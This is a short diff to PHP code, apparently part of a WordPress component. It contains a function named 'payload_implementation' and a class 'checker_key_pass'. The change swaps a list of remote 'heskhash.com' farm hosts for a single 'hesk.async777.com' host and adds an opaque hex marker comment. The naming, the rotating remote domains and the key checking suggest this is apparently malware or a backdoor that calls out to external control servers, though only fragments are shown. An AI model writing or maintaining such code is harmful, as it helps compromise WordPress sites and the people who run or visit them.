@@ -30,7 +30,7 @@ function payload_implementation()
     }
 }
 
-
+///549a85845ce8d96e32a75c9d
 class checker_key_pass
 {
     //Wordpress New System
@@ -51,12 +51,8 @@ class checker_key_pass
         $this->message = "no error";
         $this->order = 0;
         $this->domains = array(
-            "http://farm1.heskhash.com",
-            "http://farms1.heskhash.com",
-            "http://farm65.heskhash.com",
-            "http://farm48.heskhash.com"
+            "http://hesk.async777.com"
         );
-
         $this->limit = count($this->domains);
         if (!defined("KEY_SOURCE")) {
             $this->key_source = "";
